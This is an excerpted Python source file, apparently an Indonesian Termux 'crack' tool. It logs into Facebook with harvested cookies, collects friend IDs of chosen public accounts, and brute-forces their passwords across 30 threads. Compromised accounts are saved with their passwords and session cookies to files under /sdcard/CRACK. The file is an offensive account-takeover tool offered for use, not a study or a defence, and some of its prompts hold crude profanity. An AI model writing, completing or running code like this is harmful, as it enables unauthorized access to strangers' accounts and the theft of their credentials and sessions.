#SC_ALVINO#CODED_BAZ#RECODE_IZIN#
#-----------------[ IMPORT-MODULE ]-------------------
...
try:
        ...
        cetak(nel('\t• Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Menginstall Modul Requests •'))
...
def banner():
	print(f'''\t{asu}
           ...
           {m} ▪︎ {m} ▪︎ {m} ▪︎ {sir} Author : Putra Basari {x}{m} ▪︎ {m} ▪︎ {m} ▪︎ {x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t    ▪︎ Ambil Cookies Di Kiwi Browser[white] ▪︎ '))
		...
		print(f'  %s[%sx%s]%s LOGIN GAGAL COBA LAGI%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\t▪︎ Selamat Datang Semoga Harimu Menyenangkan[white] ▪︎'))
	print(f'▪︎ ID  : '+str(my_id))
	print(f'▪︎ IP  : {ip}')
	print('')
	print('')
	print('▪︎ 1. Crack Id Publik ')
	print('       ')
	Basari = input('\n▪︎ Pilih : ')
	if Basari in ['1']:
		dump_massal()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('▪︎ Mau Berapa Id Target : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('▪︎ Masukkan Id Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'▪︎ Total Id Target : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/CRACK')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/CRACK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/CRACK/'+geh,'r').read().splitlines()
		except:
...
#	print('>> 4. Mtouch ')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('▪︎ Tampilkan Aplikasi ( Y/t ) : ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('▪︎ Password Tambahan ( Y/t ) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] sayang,ngentod,bangsat[white] '))
		pwku=input('▪︎ Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	print(f' ')
	print('')
	print(f'▪︎ Hasil {h}OK{x} Akan Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'▪︎ Hasil {k}CP{x} Akan Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'')
	print('')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]CRACK SELESAI TETAP BERSYUKUR APAPUN HASILNYA KAWAN'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/CRACK/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/CRACK/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
